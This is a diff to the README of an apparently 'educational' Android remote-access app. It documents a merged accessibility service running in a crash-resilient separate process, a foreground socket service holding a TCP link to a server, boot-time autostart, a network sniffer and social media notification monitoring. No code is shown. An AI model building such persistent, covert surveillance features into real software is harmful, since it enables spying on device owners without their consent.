@@ -88,8 +88,26 @@ The Android client supports all commands listed above plus:
 - Network sniffer (NetworkSniffer.java — autonomous, no command interface)
 - Social media notification monitoring (SocialMediaMonitor.java)
 
+## Accessibility Module (Merged)
+
+The standalone accessibility service from `accessibility-apk/` has been merged into the main app as a separate process. Files are in `app/src/main/java/com/remoteaccess/educational/accessibility/`:
+- **StandaloneAccessibilityService** — Accessibility service running in `:standalone` process; survives main process crashes
+- **SocketService** — Foreground service maintaining the TCP connection for the standalone process
+- **SocketClient** — Lightweight socket client reading server URL/deviceId from SharedPreferences
+- **ConfigActivity** — Minimal activity to configure server URL and open Accessibility Settings
+- **BootReceiver** — (merged into main BootReceiver) starts both services on boot
+
+The main app's BootReceiver now starts both `RemoteAccessService` and the standalone `SocketService` on boot/reinstall.
+
+Two accessibility services are declared in the manifest:
+- `.services.UnifiedAccessibilityService` — main process, full feature set
+- `.accessibility.StandaloneAccessibilityService` — `:standalone` process, resilient fallback
+
+Resource: `res/xml/accessibility_service_config_standalone.xml`
+
 ## Build
 
 Android build output: `app/build/outputs/apk/debug/app-debug.apk`
 Build config: `settings.gradle`, `gradle.properties`, `local.properties`, `gradle/wrapper/gradle-wrapper.properties`
-Requires: Android SDK (platform-tools, platforms;android-34, build-tools;34.0.0), Java 17, Gradle 8.2
+Requires: Android SDK (platform-tools, platforms;android-36, build-tools;35.0.0), Zulu JDK 17, Gradle 8.7
+Run `bash build.sh` to build — produces a single unified APK at `apk-output/RemoteAccess-debug.apk`
